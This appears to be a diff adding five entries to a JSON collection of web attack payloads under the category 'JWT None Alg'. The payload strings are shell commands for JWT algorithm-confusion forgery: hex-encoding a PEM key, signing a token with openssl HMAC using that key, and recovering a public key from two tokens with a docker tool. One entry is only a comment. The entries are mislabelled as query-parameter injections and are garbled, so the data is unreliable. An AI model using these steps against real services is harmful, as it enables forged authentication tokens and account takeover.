@@ -37893,5 +37893,60 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-242558",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "# decode the token before encoding with type 'None'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "alg|none|kid"
+    }
+  },
+  {
+    "payload_id": "OWP-242559",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ cat key.pem | xxd -p | tr -d \"\\\\n\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "alg|none|kid"
+    }
+  },
+  {
+    "payload_id": "OWP-242560",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ echo -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "alg|none|kid"
+    }
+  },
+  {
+    "payload_id": "OWP-242561",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ docker run -it ttervoort/jws2pubkey JWS1 JWS2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "alg|none|kid"
+    }
+  },
+  {
+    "payload_id": "OWP-242562",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ docker run -it ttervoort/jws2pubkey \"$(cat sample-jws/sample1.txt)\" \"$(cat sample-jws/sample2.txt)\" | tee pubkey.jwk",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "alg|none|kid"
+    }
   }
 ]
